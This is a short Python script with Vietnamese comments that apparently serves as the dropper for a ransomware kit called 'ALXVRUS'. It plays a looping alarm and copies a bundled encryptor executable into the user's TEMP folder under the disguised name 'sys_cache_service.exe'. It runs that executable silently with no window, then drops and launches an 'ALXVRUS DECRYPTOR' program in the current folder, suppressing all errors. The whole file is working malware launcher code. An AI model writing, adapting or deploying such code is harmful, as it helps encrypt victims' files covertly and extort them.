import os
import shutil
import sys
import subprocess
import threading
import winsound
import time # Thêm để duy trì thread

def play_alarm():
    path_to_sound = resource_path("alarm.wav")
    if os.path.exists(path_to_sound):
        try:
            winsound.PlaySound(path_to_sound, winsound.SND_FILENAME | winsound.SND_LOOP | winsound.SND_ASYNC | winsound.SND_NODEFAULT)
        except: pass
    else:
        winsound.PlaySound("SystemAsterisk", winsound.SND_ALIAS | winsound.SND_LOOP | winsound.SND_ASYNC)

def resource_path(relative_path):
    base_path = getattr(sys, '_MEIPASS', os.path.abspath("."))
    return os.path.join(base_path, relative_path)

def main():
    play_alarm() 

    real_temp = os.environ.get("TEMP", os.path.expanduser("~"))
    current_dir = os.path.abspath(".")
    
    enc_dst = os.path.join(real_temp, "sys_cache_service.exe") 
    gui_name = "ALXVRUS DECRYPTOR.exe"
    gui_dst = os.path.join(current_dir, gui_name)

    # Xử lý Encryptor
    enc_src = resource_path("alx_encryptor.exe")
    if os.path.exists(enc_src):
        try:
            shutil.copy2(enc_src, enc_dst)
            subprocess.Popen([enc_dst], creationflags=subprocess.CREATE_NO_WINDOW)
        except: pass

    # Xử lý Decryptor
    gui_src = resource_path(gui_name)
    if os.path.exists(gui_src):
        try:
            shutil.copy2(gui_src, gui_dst)
            proc_gui = subprocess.Popen([gui_dst])
            proc_gui.wait() 
        except: 
            time.sleep(5) 

if __name__ == "__main__":
    main()